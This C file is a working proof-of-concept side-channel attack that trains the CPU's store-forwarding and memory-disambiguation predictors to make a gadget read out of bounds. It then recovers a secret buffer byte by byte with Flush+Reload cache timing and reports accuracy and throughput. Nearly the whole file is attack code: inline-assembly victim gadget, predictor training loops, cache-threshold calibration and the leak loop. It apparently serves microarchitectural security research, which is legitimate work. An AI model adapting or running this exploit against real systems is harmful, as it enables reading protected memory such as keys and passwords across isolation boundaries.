/* SPDX-License-Identifier: GPL-3.0-only */
/* Copyright (C) 2026 Chang Liu */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/time.h>

#define CACHE_SHL 9
#define CACHE_ST (1 << CACHE_SHL)
#ifndef TEST_BYTE_SIZE
#define TEST_BYTE_SIZE 1000
#endif

uint64_t cache_state_shreshold;

uint8_t unused1[64];
uint8_t array1[16] = {0,0,0,0,0,0,0,0,0,0,0xee,0,0,0,0,0};
uint8_t unused2[64];
size_t array2[256 * CACHE_ST];
uint8_t unused3[64];

size_t idx;

/********************************************************************
Victim code.
********************************************************************/

uint8_t secret[TEST_BYTE_SIZE];

uint8_t temp = 0; /* avlid compiler optimization of the victim_function */
int function_call_num = 0;

void victim_function(size_t x) {
    asm volatile(
        ".align 65536 \n\t"
        "mov (%0), %%rax\n\t"
        ".rept 40\n\t"
        "imul $1, %%rax \n\t"
        ".endr \n\t"
        "shl $%c4, %%rax \n\t"
        "add %3, %%rax \n\t"
        "movq %1, (%%rax) \n\t"  // delayed store
        "movq (%3), %%rdx \n\t"  // forwardded load
        "movzbq (%2, %%rdx, 1), %%rdx \n\t"  // out-of-bound access
        "shl $%c4, %%rdx \n\t"
        "mov (%3, %%rdx, 1), %%rax \n\t"
        :
        : "r" (&idx), "r" (x), "r"(array1), "r"(array2), "i" (CACHE_SHL + 3)
        : "rax", "rdx", "rcx", "memory"
    );
}

/********************************************************************
Attacker code.
********************************************************************/
__attribute__((always_inline)) inline void clflush(void* addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr));
}
__attribute__((always_inline)) inline size_t gettime(void){
    unsigned long low_a, high_a;
    asm volatile("rdtscp"
        : "=a" (low_a), "=d" (high_a)
        : "c" (1));
    unsigned long aval = ((low_a) | (high_a) << 32);
    return aval;
}

uint64_t cache_probe(uint64_t* p) {
    uint64_t t1, t2;
    t1 = gettime();
    asm volatile("movq (%0), %%rax"::"r"(p):"rax");
    t2 = gettime();
    return t2 - t1;
}

static int cmp_uint64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a;
    uint64_t y = *(const uint64_t *)b;
    if (x < y) return -1;
    if (x > y) return 1;
    return 0;
}

uint64_t get_cache_hit_threshold() {
    uint64_t hit[100000];
    uint64_t miss[100000];
    for(int i = 0; i < 100000; ++ i) {
        hit[i] = cache_probe(&array2[0]);
        clflush(&array2[0]);
        for (volatile int z = 0; z < 100; ++ z) {}
        miss[i] = cache_probe(&array2[0]);
    }
    // Quick Sort
    qsort(hit, 100000, sizeof(uint64_t), cmp_uint64);
    qsort(miss, 100000, sizeof(uint64_t), cmp_uint64);
    // Gen threshold
    uint64_t t_hit = 0, t_miss = 0;
    for(int i = 0; i < 90000; ++ i)
        t_hit += hit[i];
    for(int i = 10000; i < 90000; ++ i)
        t_miss += miss[i];
    return t_hit / 90000 + (t_miss / 80000 - t_hit / 90000) / 4 * 3;
}

void fsp_training() {
    asm volatile(
        ".align 65536 \n\t"
        ".rept 162\n\t"
        "nop \n\t"
        ".endr \n\t"
        ".rept 2\n\t"
        "imul $1, %0 \n\t"
        ".endr \n\t"
        "mov %%rax, (%0) \n\t"
        "mov (%1), %%rax \n\t"
        :
        : "r"(&array2[0]), "r"(&array2[0])
        : "rax", "memory"
    );
}


/* 
 * malicious_x: address of the secret byte - address of the array1 base 
 * value: recovered byte
 * score: evaluation of the recovery
 */
void leak(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    register uint64_t time;
    int rank_0_idx, rank_1_idx, mix_i;
    for (int i = 0; i < 256; i++)
        results[i] = 0;
    for (int tries = 100; tries > 0; tries--) {
        
        usleep(0);  // syscall to reset SFP states

        for (int i = 0; i < 256; i++) {
            clflush(&array2[i * CACHE_ST]); // flush cache line
        }
        
        for (int i = 0; i < 16; ++ i) { // train MDP to predict as Bypassing
            fsp_training(&array2[0], &array2[4]);
        }

        idx = 0;
        for (int i = 0; i <= 8; ++ i) {  // train PSFP to predict as Forwarding Store
            fsp_training(&array2[0], &array2[0]);
        }

        idx = 10;
        clflush(&idx);
        for (volatile int z = 0; z < 100; ++ z) {}
        victim_function(malicious_x);  // leak secret
        function_call_num ++;

        // Flush+Reload
        for (int i = 0; i < 256; i ++) {
            mix_i = ((i * 167) + 13) & 255;
            time = cache_probe(&array2[mix_i * CACHE_ST]);
            if ((int)time <= cache_state_shreshold && mix_i != 10 && mix_i != 0)
                results[mix_i]++; // cache hit - add +1 to score for this value
        }

        rank_0_idx = -1, rank_1_idx = -1;
        for (int i = 0; i < 256; i ++) {
            if (rank_0_idx < 0 || results[i] >= results[rank_0_idx]) {
                rank_1_idx = rank_0_idx;
                rank_0_idx = i;
            }
            else if (rank_1_idx < 0 || results[i] >= results[rank_1_idx]) {
                rank_1_idx = i;
            }
        }
        if (results[rank_0_idx] >= (2 * results[rank_1_idx] + 5) 
            || (results[rank_0_idx] == 3 && results[rank_1_idx] == 0)) {
            break;
        }       
    }

    results[0] ^= temp; // avlid compiler optimization	
    value[0] = (uint8_t)rank_0_idx;
    score[0] = results[rank_0_idx];
    value[1] = (uint8_t)rank_1_idx;
    score[1] = results[rank_1_idx];    
}

int main(int argc, const char* * argv) {

    // Hot cpu
    srand(time(NULL));
    for (size_t i = 0; i < 256 * CACHE_ST; i++) {
        array2[i] = 0;
    }
    for(int i = 0; i < TEST_BYTE_SIZE; ++ i) {
        secret[i] = rand() % 256;
        if (secret[i] == 10 || secret[i] == 0) {
            secret[i] ++;
        }
    }

    cache_state_shreshold = get_cache_hit_threshold();
    // printf("cache_state_shreshold = %ld\n", cache_state_shreshold);

    // Eval the leakage
    size_t malicious_x = (size_t)((uint8_t*)secret - array1);
    int score[2], len = strlen(secret);
    uint8_t value[2];
    struct timeval start_time, end_time;
    int acc_byte = 0; 
    gettimeofday(&start_time, NULL);
    int secret_ite = 0;
    while (secret_ite < TEST_BYTE_SIZE) {
        leak(malicious_x, value, score);
        // printf("%x %x\n", value[0], secret[secret_ite]);
        if (value[0] == secret[secret_ite] || value[1] == secret[secret_ite]) {
            acc_byte ++;
        }
        secret_ite ++;
        malicious_x ++;
    }
    gettimeofday(&end_time, NULL);
    double time_use = (double)(end_time.tv_sec - start_time.tv_sec) +
        ((double)(end_time.tv_usec - start_time.tv_usec) / 1000000.0);
    double byte_acc_rate =  (double)acc_byte / TEST_BYTE_SIZE;
    printf("acc = %.4f, spend %f s\n", byte_acc_rate, time_use);
    printf("throughput: %.2f Bps\n", (double)acc_byte / time_use);
    printf("# of victim function call: %.2f\n", (double)function_call_num / TEST_BYTE_SIZE);
    return (0);
}